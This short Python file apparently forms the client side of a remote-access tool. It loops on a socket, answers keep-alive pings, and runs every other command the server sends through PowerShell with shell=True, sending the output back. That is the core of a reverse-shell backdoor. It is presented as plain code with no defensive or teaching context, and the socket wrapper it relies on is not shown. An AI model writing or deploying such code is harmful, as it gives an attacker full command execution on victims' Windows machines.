from socket import socket
import subprocess
import os
import time  # Add the time module

def handleConnection(my_socket):
    while True:
        command = my_socket.recieve_data()

        if command == "keep_alive":
            # If the server sends a keep-alive request, respond with "alive"
            my_socket.send_data("alive")
        else:
            print(command)
            output = subprocess.run(["powershell", command], shell=True, capture_output=True)
            output = output.stdout.decode("UTF-8")
            my_socket.send_data(output)